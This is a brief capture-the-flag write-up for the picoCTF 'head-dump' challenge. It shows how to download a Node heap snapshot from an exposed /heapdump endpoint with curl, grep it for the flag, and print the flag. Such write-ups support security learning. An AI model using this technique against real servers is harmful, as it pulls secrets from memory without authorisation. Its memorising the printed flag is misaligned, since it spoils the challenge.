# picoCTF - head-dump

## Execution Procedure

### 1. Open the API Documentation

Navigate to:

```text
/api-docs/
```

### 2. Find the Heapdump Endpoint

Under **Diagnosing**, locate:

```text
GET /heapdump
```

### 3. Download the Heap Dump

```bash
curl -o heapdump.heapsnapshot \
  'http://TARGET_IP:PORT/heapdump'
```

### 4. Verify the File

```bash
ls -lh heapdump.heapsnapshot
file heapdump.heapsnapshot
```

### 5. Search for the Flag

```bash
grep -aEio 'picoCTF\{[^}]+\}' heapdump.heapsnapshot
```

### 6. Flag

```text
picoCTF{Pat!3nt_15_Th3_K3y_dc0756a3}
```
